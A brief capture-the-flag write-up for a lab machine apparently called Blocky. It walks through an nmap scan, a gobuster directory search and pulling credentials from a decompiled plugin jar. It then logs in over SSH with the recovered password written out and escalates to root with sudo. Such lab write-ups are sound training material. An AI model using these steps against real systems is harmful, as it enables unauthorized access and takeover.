I ran the usual nmap command, but had trouble getting the version of the FTP server:

```
nmap -sC -sV {victim ip}
```
I was able to get the port, 21, but it returned the value `?`, the other writeups I looked at were able to get that from the same command.

From visiting the website I was able to find that it is a wordpress website run on php.

Running gobuster as a directory search:
```
gobuster dir -u http://10.10.10.37 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```
In the directory `/plugins` I found the file `BlockyCore.jar`, we'll need to download `jd-gui` to look at the file. We will find SQL credentials there.

We can use `ssh` to login 
```
sshpass -p 8YsqfCTnvxAUeduzjNSXe22 ssh notch@10.10.10.37
```
I run `sudo -l`, turns out notch may run all commands on  Blocky. 

```
sudo su -
```
The above commands get us root.

We run `cat root.txt` and it gets us our flag.



